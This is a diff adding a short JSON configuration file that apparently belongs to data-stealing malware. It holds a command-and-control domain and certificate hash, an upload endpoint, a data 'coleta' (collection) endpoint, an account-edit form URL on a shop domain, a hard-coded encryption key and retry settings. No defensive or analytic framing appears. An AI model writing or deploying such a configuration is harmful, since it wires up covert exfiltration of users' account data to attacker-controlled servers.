@@ -1,0 +1,12 @@
+{
+    "upload_url":   "https://driffle.com/assets/upload.php",
+    "form_url":     "https://driffle.com//minha-conta/editar-dados",
+    "data_url":     "https://driffle.com/v1/coleta",
+    "c2_domain": "127.0.0.1",
+    "c2_cert_hash": "d8b39c6c112a1e2fcd75c9d0ea55a4d79888c4eaa1244e49f70db39e709bc1c4",
+    "max_retries":  5,
+    "retry_backoff": 2,
+    "encryption_key": "MDEyMzQ1Njc4OWFiY2RlZg==", 
+    "log_level":    "WARNING"
+  }
+  
